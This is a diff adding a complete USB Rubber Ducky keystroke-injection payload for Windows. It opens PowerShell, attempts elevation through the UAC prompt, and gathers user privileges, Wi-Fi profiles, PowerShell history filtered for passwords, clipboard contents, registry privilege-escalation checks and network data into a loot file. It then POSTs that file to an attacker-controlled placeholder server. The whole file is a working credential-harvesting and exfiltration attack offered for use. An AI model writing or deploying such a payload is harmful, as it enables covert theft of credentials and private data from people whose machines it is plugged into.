@@ -1,0 +1,72 @@
+ATTACKMODE STORAGE
+WAIT_FOR_BUTTON_PRESS
+ATTACKMODE HID STORAGE
+DELAY 1000
+REM_BLOCK DOCUMENTATION
+    Some things stolen from https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/credentials/SamDumpDucky/payload.txt 
+END_REM
+WINDOWS r
+DELAY 500
+STRING powershell -nop -noni
+REM Attempting to elevate privs
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRINGLN cd ~
+
+REM STRINGLN $I = (gwmi win32_volume -f 'label=''DUCKY''').Name
+DELAY 500
+STRINGLN whoami /priv > loot.txt
+DELAY 500
+STRINGLN whoami /all >> loot.txt
+DELAY 500
+STRINGLN net user >> loot.txt
+DELAY 500
+STRINGLN netsh wlan show profile >> loot.txt
+DELAY 500
+STRINGLN type C:\Windows\System32\drivers\etc\hosts >> loot.txt
+DELAY 500 
+STRINGLN net localgroup >> loot.txt
+
+REM Getting the console history 
+STRINGLN type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt >> loot.txt
+DELAY 500
+STRINGLN type C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt >> loot.txt
+DELAY 500
+STRINGLN type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt >> loot.txt
+DELAY 500
+STRINGLN cat (Get-PSReadlineOption).HistorySavePath >> loot.txt
+DELAY 500
+STRINGLN cat (Get-PSReadlineOption).HistorySavePath | sls passw >> loot.txt
+DELAY 500
+STRINGLN systeminfo >> loot.txt
+DELAY 1000
+
+REM More advanced Enum
+STRINGLN reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> loot.txt
+DELAY 3000
+STRINGLN reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> loot.txt
+DELAY 3000
+STRINGLN klist sessions >> loot.txt
+DELAY 1000
+STRINGLN net accounts >> loot.txt
+DELAY 1000
+STRINGLN powershell -command "Get-Clipboard" >> loot.txt
+DELAY 1000
+STRINGLN net share >> loot.txt
+DELAY 2000
+STRINGLN arp -A >> loot.txt
+DELAY 1000
+STRINGLN $file = "~/loot.txt"
+DELAY 500
+STRINGLN $uri = "http://your-domain:8080/"
+DELAY 500
+
+REM Remember to change to cookie value to match your receiver 
+STRINGLN $headers = @{"Content-Type" = "application/octet-stream";"User-Agent" = "you_secret_value"}
+DELAY 500
+STRINGLN Invoke-WebRequest -Uri $uri -Method Post -Body (Get-Content $file -Raw) -Headers $headers -TimeoutSec 10
+DELAY 20000
+STRINGLN exit
